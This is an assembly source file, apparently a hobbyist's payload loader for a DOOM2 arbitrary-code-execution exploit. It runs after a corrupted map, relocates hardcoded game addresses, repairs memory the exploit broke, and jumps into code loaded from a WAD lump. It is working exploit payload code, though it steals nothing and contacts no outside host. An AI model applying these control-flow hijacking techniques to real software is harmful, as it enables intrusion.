// kgsws' DOOM2 code execution
// - this code is running from memory block allocated by cached REJECT lump
// - this source only contains payload, you still need exploited map
//
// %eax - address somewhere in code
// %ebx - address somewhere in data

#define TEXT_START	0x1000

.section .text
.globl _start

// Loaders purpose is
// - free everything it can
// - allocate memory for the code and copy it
// - allocate memory for .bss and clear it
// - run the code

_start:
	// backup everything needed
	// %ebx was backed up by the exploit
	push	%ecx
	push	%edx
	push	%esi
	push	%edi
	push	%ebp

	// get _start base
	mov	(%ebx),%esi
	add	$(-TEXT_START),%esi	// ESI will always point to local base
	// get DATA base
	sub	$0x2c114,%ebx
	push	%ebx
	// get CODE base
	sub	$0x2e922,%eax

	// relocate CODE references
	mov	$reloc_code_start,%ebx
	mov	$((reloc_code_end-reloc_code_start)/4),%edx
	call	do_reloc

	// relocate DATA references
	pop	%eax
	mov	$reloc_data_start,%ebx
	mov	$((reloc_data_end-reloc_data_start)/4),%edx
	call	do_reloc

	// fix what map exploit broke
	mov	fixaddr0(%esi),%ebx
	mov	$0x0364,%eax
	mov	%eax,(%ebx)
	xor	%ax,%ax
	mov	%eax,4(%ebx)
	mov	fixaddr1(%esi),%ebx
	mov	$0x033e,%ax
	mov	%eax,(%ebx)
	mov	$0x03e8,%ax
	mov	%eax,4(%ebx)

	// force title screen
	mov	gamestate(%esi),%eax
	movw	$3,(%eax)
	mov	wipegamestate(%esi),%eax
	movw	$-1,(%eax)
	call	*D_StartTitle(%esi)
	mov	titlepic_str(%esi),%eax
	mov	pagename(%esi),%ebx
	mov	%eax,(%ebx)

	// stop sound (to free the data)
	call	*S_Start(%esi)

	// stop music (to free the data)
	call	*S_StopMusic(%esi)

	// free everything not needed
	mov	$50,%eax	// from PU_LEVEL
	mov	$255,%edx	// and everything else
	call	*Z_FreeTags(%esi)

	// get ACE_CODE lump
	lea	ace_code(%esi),%eax
	call	*W_CheckNumForName(%esi)
	test	%eax,%eax
	jl	ace_code_error

	// get lumpinfo base
	push	%eax	// backup lumpnum
	lea	0x0(,%eax,4),%edx
	add	%edx,%eax
	lea	0x0(,%eax,4),%edi	// EDI will point to ACE_CODE lump info
	mov	lumpinfo(%esi),%edx
	add	(%edx),%edi

	// get ACE_END lump
	lea	ace_end(%esi),%eax
	call	*W_CheckNumForName(%esi)
	test	%eax,%eax
	jl	ace_code_error
	mov	(%esp),%ebx
	sub	%ebx,%eax
	jl	ace_code_error

	// disable lumps between ACE_CODE and ACE_END
	mov	%edi,%ebx
dis_loop:
	// change first character in name
	movb	$0xCC,(%ebx)
	add	$20,%ebx
	dec	%eax
	jnz	dis_loop

	// check lump size
	mov	16(%edi),%eax	// ->size
	test	%eax,%eax
	jnz	do_load

ace_code_error:
	// it's empty!
	lea	error_text(%esi),%eax
	push	%eax
	call	*I_Error(%esi)

do_load:
	// read .bss size
	mov	8(%edi),%eax	// ->handle
	mov	12(%edi),%edx	// ->position
	xor	%ebx,%ebx	// SEEK_SET
	call	*lseek(%esi)
	mov	8(%edi),%eax	// ->handle
	lea	lumpinfo(%esi),%edx
	mov	$4,%ebx
	call	*read(%esi)

	// allocate memory for payload and its .bss
	mov	lumpinfo(%esi),%eax // .bss size
	add	16(%edi),%eax	// + lump size
	mov	$1,%edx	// PU_STATIC
	xor	%ebx,%ebx // NULL
	call	*Z_Malloc(%esi)

	// read ACE_CODE lump
	mov	%eax,%edx
	pop	%eax	// restore lumpnum
	push	%edx	// backup code pointer
	call	*W_ReadLump(%esi)

	// pass relocation info
	mov	_code_base(%esi),%ebx
	mov	_data_base(%esi),%ecx

	// run the code
	pop	%eax	// restore code pointer
	add	$4,%eax
	jmp	*%eax

// relocate the section
// %eax - section base
// %ebx - reloc start
// %edx - reloc count
do_reloc: // TODO: rework; there is always one element
	add	%esi,%ebx
do_reloc_loop:
	test	%edx,%edx
	jz	do_reloc_end
	dec	%edx
	add	%eax,(%ebx)
	add	$4,%ebx
	jmp	do_reloc_loop
do_reloc_end:
	ret

//
// strings
ace_code:
	.string "ACE_CODE"
ace_end:
	.string "ACE_END"
error_text:
	.string "-= kgsws' Doom2 ACE loader =-\nACE_CODE is missing or broken."

//
// tables

// pointers to the CODE section
// everything here has to be called indirectly
reloc_code_start:
//
_code_base:
	.4byte	0
I_Error:
	.4byte	0x0001AB10
D_StartTitle:
	.4byte	0x0001D810
Z_Malloc:
	.4byte	0x00039690
S_Start:
	.4byte	0x0003F600
S_StopMusic:
	.4byte	0x0003EC40
Z_FreeTags:
	.4byte	0x00039780
W_CheckNumForName:
	.4byte	0x00038AF0
W_ReadLump:
	.4byte	0x00038BF0
lseek:
	.4byte	0x000408c0
read:
	.4byte	0x00040935
autorun_offs:
	.4byte	0x0001fbc5
remove_mobj:
	.4byte	0x00030ea8
//
reloc_code_end:

// pointers to the DATA section
// everything here has to be addressed indirectly
reloc_data_start:
//
_data_base:
	.4byte	0
gamestate:
	.4byte	0x0002B3F4
wipegamestate:
	.4byte	0x00011B40
pagename:
	.4byte	0x0002a388
lumpinfo:
	.4byte	0x00074FA4
titlepic_str:
	.4byte	0x00021430
fixaddr0:
	.4byte	0x0001B944
fixaddr1:
	.4byte	0x0001D530
//
reloc_data_end:


